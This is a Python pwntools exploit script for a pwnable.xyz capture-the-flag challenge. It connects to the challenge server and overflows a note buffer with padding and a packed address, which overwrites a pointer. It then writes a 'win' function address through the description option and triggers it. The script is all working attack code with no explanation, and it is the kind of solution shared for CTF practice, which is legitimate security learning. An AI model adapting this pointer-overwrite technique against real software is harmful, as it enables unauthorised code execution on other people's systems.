from pwn import *

payload = '0'*32+p64(0x601220)

win_address = p64(0x40093c)

context.terminal = ['tmux', 'splitw', '-h']

def edit_note(prs, note_len, note):
    print prs.recvuntil('> ')
    prs.sendline('1')
    print prs.recv()
    prs.sendline(str(note_len))
    print prs.recv()
    prs.sendline(note)

def edit_desc(prs, desc):
    print prs.recvuntil('> ')
    prs.sendline('2')
    print prs.recv()
    prs.sendline(win_address)

p = remote('svc.pwnable.xyz', 30016)
#p = process('./challenge')

pause()
edit_note(p, 100, payload)
edit_desc(p, win_address)
print p.recvuntil('> ')
p.sendline('4')
print p.recv()
